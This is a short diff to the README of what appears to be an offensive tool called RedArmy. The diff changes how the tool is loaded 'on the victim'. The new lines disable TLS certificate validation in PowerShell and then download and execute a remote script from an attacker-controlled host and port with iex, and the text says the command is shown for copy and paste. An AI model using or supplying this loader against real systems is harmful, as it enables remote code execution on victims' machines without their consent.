@@ -87,8 +87,10 @@ Options:
 Once the `serve` script is running, you can use the following to load
 RedArmy on the victim:
 
-- `iex (iwr -DisableKeepAlive -UseBasicParsing
-  http://<ip>:<port>/invade.html)`
+```
+PS> [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
+PS> iex ((New-Object System.Net.WebClient).DownloadString("http://<ip>:<port>/invade.html"))
+```
 
 That command will also displayed for you to copy and paste for
 convenience.
